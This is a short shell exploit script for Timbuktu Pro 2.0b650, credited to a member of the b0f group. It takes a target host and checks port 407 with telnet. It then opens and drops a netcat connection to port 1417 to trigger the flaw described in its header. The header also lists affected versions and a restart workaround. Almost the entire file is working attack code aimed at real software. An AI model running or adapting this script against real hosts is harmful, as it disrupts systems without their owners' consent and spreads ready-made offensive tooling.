#!/bin/sh

##########################################
# eth0 is a member of b0f/buffer0verfl0w security  #
#
http://b0f.freebsd.lublin.pl
#
#########################################

# *Needs netcat in order to work......*
# Immune systems:
# Timbuktu Pro 2000
#
# Vulnerable systems:
# Timbuktu Pro 2.0b650 (Also incorrectly known as Timbukto)
#
# Exploit:
#  - Connect and disconnect to port TCP/407 and port TCP/1417 will start

# listening.
#  - Connect on port TCP/1417 (using a simple telnet client).
#  - Disconnect from TCP/1417 (with no data exchange).
#
# Workaround:
# - Kill Timbuktu process (using pslist/pskill for example).
# - Stop Timbuktu services.
# - Start them again.


echo "Exploit:"
echo " - Connect and disconnect to port TCP/407 and port TCP/1417 will
start listening."
echo " - Connect on port TCP/1417 (using a simple telnet client)."
echo " - Disconnect from TCP/1417 (with no data exchange)."
echo "Coded: eth0 from buffer0vefl0w security (b0f)"
echo "[http://b0f.freebsd.lublin.pl]"

echo "Checking if host is actually listening on port 407"
telnet $1 407 1>.timb.tmp 2>.timb.tmp &
echo "Sleeping 5 seconds..."
sleep 5
killall -9 telnet 1>/dev/null 2>/dev/null
cat .timb.tmp | grep "Connected" >/dev/null 2>&1
if [ $? -eq 0 ]; then
 timb="1"
echo "[$1] is listening on port 407..."
echo "Exploiting:..."
nc $1 1417 1>/dev/null 2>/dev/null
sleep 3
killall -9 nc 1>/dev/null 2>/dev/null
echo "Done!!"
fi
if [ "$timb" != "1" ]; then
 echo "[$1] Is not listening on port 407 = doesn't exist..."
fi

# http://b0f.freebsd.lublin.pl #
